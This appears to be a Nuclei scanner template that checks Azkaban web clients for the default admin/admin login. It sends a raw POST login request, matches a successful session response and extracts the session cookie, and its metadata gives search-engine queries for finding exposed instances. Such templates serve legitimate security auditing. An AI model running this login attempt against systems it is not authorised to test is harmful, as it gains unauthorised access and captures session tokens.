id: azkaban-default-login

info:
  name: Azkaban Web Client Default Credentials
  author: pussycat0x
  severity: high
  description: Azkaban web client default login credentials were discovered.
  classification:
    cwe-id: CWE-798
    cpe: cpe:2.3:a:azkaban_project:azkaban:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: azkaban_project
    product: azkaban
    shodan-query: http.title:"azkaban web client"
    fofa-query: title="azkaban web client"
    google-query: intitle:"azkaban web client"
    runzero-match: any(each(service["html.titles"]), {# matches "Azkaban Web Client"})
  tags: default-login,azkaban

http:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        action=login&username={{username}}&password={{password}}

    payloads:
      username:
        - admin
      password:
        - admin
    attack: pitchfork

    matchers-condition: and
    matchers:
      - type: word
        words:
          - '"session.id"'
          - '"success"'
        condition: and

      - type: word
        words:
          - 'azkaban.browser.session.id'
          - 'application/json'
        condition: and
        part: header

      - type: status
        status:
          - 200

    extractors:
      - type: kval
        kval:
          - azkaban.browser.session.id

